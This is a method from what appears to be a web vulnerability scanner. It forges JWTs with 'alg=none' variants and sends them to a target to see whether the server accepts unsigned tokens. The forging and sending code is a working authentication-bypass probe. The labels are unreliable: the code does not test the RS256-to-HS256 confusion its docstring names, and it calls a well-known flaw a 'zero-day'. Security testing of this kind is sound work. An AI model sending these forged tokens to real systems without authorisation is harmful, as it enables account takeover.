    def test_zeroday_jwt_alg_confusion_matrix(self):
        """Zero-day #32 — JWT Algorithm Confusion (RS256→HS256)."""
        if not self.deep: return
        self._print("[*]", "Zero-day: JWT Algorithm Confusion...", "INFO")
        import base64, json as _json
        # First fetch a JWT and the public key (if /.well-known/jwks.json)
        r = self._get(self.target)
        if not r: return
        cookies = r.cookies.get_dict() if hasattr(r.cookies, 'get_dict') else {}
        jwt_token = None
        for v in list(cookies.values()) + [r.headers.get("Authorization", "")]:
            if v and v.count(".") == 2:
                jwt_token = v.replace("Bearer ", "")
                break
        if not jwt_token: return
        try:
            parts = jwt_token.split(".")
            header = _json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload = parts[1]
            sig = parts[2]
        except Exception: return
        # Try forging with HS256 using public key as HMAC secret
        # We don't have the public key here, so just probe alg=none variants
        alg_variants = ["none", "None", "NONE", "nOnE", "alg:none"]
        for alg in alg_variants:
            evil_header = {"alg": alg, "typ": "JWT"}
            evil_header_b64 = base64.urlsafe_b64encode(
                _json.dumps(evil_header).encode()).decode().rstrip("=")
            evil_jwt = f"{evil_header_b64}.{payload}."
            r2 = self._get(self.target, headers={"Authorization": f"Bearer {evil_jwt}"})
            if r2 and r2.status_code == 200:
                self._add_vuln(f"Zero-day JWT alg={alg}",
                                "CRITICAL", self.target,
                                f"Server accepted JWT with alg={alg}",
                                alg=alg)

